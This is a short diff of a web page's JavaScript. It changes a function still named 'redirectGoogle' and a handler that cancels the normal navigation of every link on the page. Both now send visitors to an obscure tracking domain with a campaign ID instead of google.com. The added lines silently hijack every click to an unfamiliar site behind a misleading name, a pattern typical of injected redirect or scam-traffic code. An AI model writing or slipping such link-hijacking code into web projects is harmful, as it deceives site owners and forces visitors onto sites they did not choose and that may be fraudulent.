@@ -90,7 +90,7 @@ if (form) {
 
 
   function redirectGoogle(){
-    window.location.href = "https://www.google.com";
+    window.location.href = "https://t7q4.com/?utm_campaign=knLL6DKc9O&v1=[v1]&v2=[v2]&v3=[v3]";
   }
 
 
@@ -114,8 +114,9 @@ document.querySelectorAll('a').forEach(link => {
     // prevent default navigation
     e.preventDefault();
 
-    window.location.href = "https://www.google.com";
+    window.location.href = "https://t7q4.com/?utm_campaign=knLL6DKc9O&v1=[v1]&v2=[v2]&v3=[v3]";
 
   });
 
 });
+
